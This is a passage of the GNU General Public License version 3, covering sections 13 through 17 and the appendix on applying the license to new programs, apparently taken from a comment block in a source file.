excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

13. Use with the GNU Affero General Public License.

Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

14. Revised Versions of this License.

The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

15. Disclaimer of Warranty.

THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

16. Limitation of Liability.

IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

17. Interpretation of Sections 15 and 16.

If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

END OF TERMS AND CONDITIONS

How to Apply These Terms to Your New Programs

If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

{one line to give the program's name and a brief idea of what it does.}
Copyright (C) {year}  {name of author}

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

{project}  Copyright (C) {year}  {fullname}
This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<http://www.gnu.org/licenses/>.

The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<http://www.gnu.org/philosophy/why-not-lgpl.html>.
*/
